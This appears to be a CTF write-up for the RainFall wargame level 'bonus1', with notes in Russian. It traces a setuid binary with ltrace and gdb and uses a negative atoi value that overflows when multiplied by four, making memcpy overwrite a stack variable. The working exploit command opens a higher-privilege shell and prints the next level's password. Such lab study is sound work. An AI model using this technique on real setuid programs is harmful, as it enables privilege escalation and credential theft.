@@ -1,0 +1,154 @@
+bonus1@RainFall:~$ ls -la
+dr-xr-x---+ 1 bonus1 bonus1   80 Mar  6  2016 .
+dr-x--x--x  1 root   root    340 Sep 23  2015 ..
+-rw-r--r--  1 bonus1 bonus1  220 Apr  3  2012 .bash_logout
+-rw-r--r--  1 bonus1 bonus1 3530 Sep 23  2015 .bashrc
+-rw-r--r--+ 1 bonus1 bonus1   65 Sep 23  2015 .pass
+-rw-r--r--  1 bonus1 bonus1  675 Apr  3  2012 .profile
+-rwsr-s---+ 1 bonus2 users  5043 Mar  6  2016 bonus1
+
+bonus1@RainFall:~$ ./bonus1
+Segmentation fault (core dumped)
+bonus1@RainFall:~$ ./bonus1 sad
+bonus1@RainFall:~$ ./bonus1 sad qwe
+bonus1@RainFall:~$ ./bonus1 sad qwe xcvz
+bonus1@RainFall:~$ ltrace ./bonus1
+__libc_start_main(0x8048424, 1, 0xbffff7a4, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0, 0x8049764, 1, 0x80482fd, 0xb7fd13e4 <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+bonus1@RainFall:~$ ltrace ./bonus1 asd
+__libc_start_main(0x8048424, 2, 0xbffff7a4, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8d0, 0x8049764, 2, 0x80482fd, 0xb7fd13e4)                                      = 0
+memcpy(0xbffff6d4, NULL, 0)                                                                = 0xbffff6d4
++++ exited (status 0) +++
+bonus1@RainFall:~$ ltrace ./bonus1 asd qwe
+__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8cc, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                      = 0
+memcpy(0xbffff6c4, "", 0)                                                                  = 0xbffff6c4
++++ exited (status 0) +++
+bonus1@RainFall:~$ ltrace ./bonus1 1
+__libc_start_main(0x8048424, 2, 0xbffff7a4, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8d2, 0x8049764, 2, 0x80482fd, 0xb7fd13e4)                                      = 1
+memcpy(0xbffff6d4, NULL, 4 <unfinished ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+bonus1@RainFall:~$ ltrace ./bonus1 1 asd
+__libc_start_main(0x8048424, 3, 0xbffff794, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8ce, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                      = 1
+memcpy(0xbffff6c4, "asd", 4)                                                               = 0xbffff6c4
++++ exited (status 0) +++
+bonus1@RainFall:~$ ltrace ./bonus1 1 asdasdasdqweqwkjebjqhwvejhgqwvehjgqvwjehv
+__libc_start_main(0x8048424, 3, 0xbffff764, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8a8, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                      = 1
+memcpy(0xbffff694, "asda", 4)                                                              = 0xbffff694
++++ exited (status 0) +++
+bonus1@RainFall:~$ ltrace ./bonus1 6 asdasdasdqweqwkjebjqhwvejhgqwvehjgqvwjehv
+__libc_start_main(0x8048424, 3, 0xbffff764, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8a8, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                      = 6
+memcpy(0xbffff694, "asdasdasdqweqwkjebjqhwve", 24)                                         = 0xbffff694
++++ exited (status 0) +++
+bonus1@RainFall:~$ ltrace ./bonus1 20 asdasdasdqweqwkjebjqhwvejhgqwvehjgqvwjehv
+__libc_start_main(0x8048424, 3, 0xbffff764, 0x80484b0, 0x8048520 <unfinished ...>
+atoi(0xbffff8a7, 0x8049764, 3, 0x80482fd, 0xb7fd13e4)                                      = 20
++++ exited (status 1) +++
+
+Видим что программа принимает два аргумента, первый аргумент попадает в atoi, а другой копируется в память
+при помощи memcpy по количеству числа в первом аргументе * 4.
+Мы уже знаем, что memcpy уязвимая функция, её и будем переполнять.
+
+но еще не понятно доконца что к чему, лезем в gdb
+(gdb) i func
+0x08048424  main
+(gdb) disas main
+   0x08048424 <+0>:	push   %ebp
+   0x08048425 <+1>:	mov    %esp,%ebp
+   0x08048427 <+3>:	and    $0xfffffff0,%esp
+   0x0804842a <+6>:	sub    $0x40,%esp
+   0x0804842d <+9>:	mov    0xc(%ebp),%eax
+   0x08048430 <+12>:	add    $0x4,%eax
+   0x08048433 <+15>:	mov    (%eax),%eax
+   0x08048435 <+17>:	mov    %eax,(%esp)
+   0x08048438 <+20>:	call   0x8048360 <atoi@plt>
+   0x0804843d <+25>:	mov    %eax,0x3c(%esp)
+   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+   0x08048446 <+34>:	jle    0x804844f <main+43>
+   0x08048448 <+36>:	mov    $0x1,%eax
+   0x0804844d <+41>:	jmp    0x80484a3 <main+127>
+   0x0804844f <+43>:	mov    0x3c(%esp),%eax
+   0x08048453 <+47>:	lea    0x0(,%eax,4),%ecx
+   0x0804845a <+54>:	mov    0xc(%ebp),%eax
+   0x0804845d <+57>:	add    $0x8,%eax
+   0x08048460 <+60>:	mov    (%eax),%eax
+   0x08048462 <+62>:	mov    %eax,%edx
+   0x08048464 <+64>:	lea    0x14(%esp),%eax
+   0x08048468 <+68>:	mov    %ecx,0x8(%esp)
+   0x0804846c <+72>:	mov    %edx,0x4(%esp)
+   0x08048470 <+76>:	mov    %eax,(%esp)
+   0x08048473 <+79>:	call   0x8048320 <memcpy@plt>
+   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+   0x08048480 <+92>:	jne    0x804849e <main+122>
+   0x08048482 <+94>:	movl   $0x0,0x8(%esp)
+   0x0804848a <+102>:	movl   $0x8048580,0x4(%esp)
+   0x08048492 <+110>:	movl   $0x8048583,(%esp)
+   0x08048499 <+117>:	call   0x8048350 <execl@plt>
+   0x0804849e <+122>:	mov    $0x0,%eax
+   0x080484a3 <+127>:	leave
+   0x080484a4 <+128>:	ret
+
+теперь нам ясно, что первый аргумент после atoi сравнимается со значением  - 9, а точнее полученное число должно быть меньше
+или равно 9.
+   0x08048441 <+29>:	cmpl   $0x9,0x3c(%esp)
+   0x08048446 <+34>:	jle    0x804844f <main+43>
+и если значение меньше или равно, то мы не попадем в условие для выхода, а пойдем выполнять memcpy.
+Так же это число первого аргумента потом сравнивается с другим значением
+   0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)
+и если значения совпадут то выполниться <execl@plt>, а там точно то что нам нужно.
+
+Теперь понятно, что чтобы получить нужное действие нам нужно при помощи memcpy переполнить буфер, который составляет 40байт
+а число должно быть не больше 9, а так же нужно еще и 4 байта на адрес использовать, итого 44.
+44 / 4 = 11, то есть нам нужно ввести число 11, как нам это сделать?
+Вспоминаем, что можно переполнить int, следовательно нам нужно такое отрицательное число, которое даст нам при умножении на 4
+переполнение и значение 44.
+
+пишем программку:
+
+
+```
+bonus1@RainFall:~$ vim /tmp/find_n.c
+
+#include <stdio.h>
+#include <limits.h>
+
+int	main(void)
+{
+	int	n;
+
+	n = INT_MIN;
+	while (n < 0)
+	{
+		if (n * 4 >= 44)
+		{
+			printf("n = %d, n * 4 = %d\n", n, n * 4);
+			break ;
+		}
+		n++;
+	}
+	return (0);
+}
+
+bonus1@RainFall:~$ gcc /tmp/find_n.c -o /tmp/find_n;
+bonus1@RainFall:~$ /tmp/find_n
+n = -2147483637, n * 4 = 44
+```
+
+Теперь подставляем число и замену значения - $0x574f4c46
+bonus1@RainFall:~$ ./bonus1 -2147483637 $(python -c 'print "A" * 40 + "\x46\x4c\x4f\x57"')
+$ whoami
+bonus2
+$ cat /home/user/bonus2/.pass
+579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
+
+su bonus2
+
+
